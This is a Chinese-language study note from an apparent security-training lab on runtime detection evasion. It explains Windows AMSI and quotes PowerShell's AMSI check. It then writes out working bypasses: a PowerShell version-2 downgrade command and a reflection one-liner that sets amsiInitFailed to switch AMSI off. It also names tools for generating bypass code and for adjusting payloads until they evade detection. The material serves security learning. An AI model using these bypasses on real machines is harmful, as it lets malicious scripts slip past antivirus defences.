# Runtime Detection Evasion

了解如何使用与工具无关的现代方法绕过常见的运行时检测措施，例如 AMSI。

---

## AMSI

AMSI（Anti-Malware Scan Interface）是一项PowerShell安全功能，允许任何应用程序或服务直接集成到反恶意软件产品中。Defender 检测 AMSI 以在 .NET 运行时内执行之前扫描有效负载和脚本。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2b3650a3d93c4b4089edc06634210731.png)

仅当从 CLR 执行时从内存加载时，才会检测 AMSI。假定如果在磁盘上，MsMpEng.exe（Windows Defender）已经被检测。

我们可以分解 AMSI PowerShell 检测的代码，以更好地了解它的实现方式并检查可疑内容。

InsecurePowerShell是PowerShell的GitHub分支，删除了安全功能;这意味着我们可以查看比较的提交并观察任何安全功能。AMSI 仅在src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs下的 12 行代码中检测。

```csharp
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }
 ```

## powershell降级

PowerShell降级攻击是一个非常容易实现的果实，它允许攻击者修改当前的PowerShell版本以删除安全功能。

大多数PowerShell会话将从最新的PowerShell引擎开始，但攻击者可以使用单行手动更改版本。通过将 PowerShell 版本“降级”到 2.0，可以绕过安全功能，因为它们直到版本 5.0 才实现。

	powershell -version 2

## powershell反射

PowerShell 反射可能被滥用来修改和识别来自有价值的 DLL 的信息。

PowerShell 的 AMSI 实用程序存储在位于AMSIUtilsSystem.Management.Automation.AmsiUtils中的 .NET 程序集中。

Matt Graeber发布了一个单行代码来实现使用反射修改和绕过AMSI实用程序的目标。

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

通过反射获取到amsiutils程序集，通过GetField获取到指定字段，在用SetValue设置这个字段的值为true

将amsiInitFailed字段设为true后，amsi将以AMSI_RESULT_NOT_DETECTED = 1响应

## 自动化工具

可以通过http://amsi.fail/自动生成绕过amsi的code

以及前几个房间用到的amsiTrigger去检测自己的payload，发现并修改自己的payload去绕过amsi
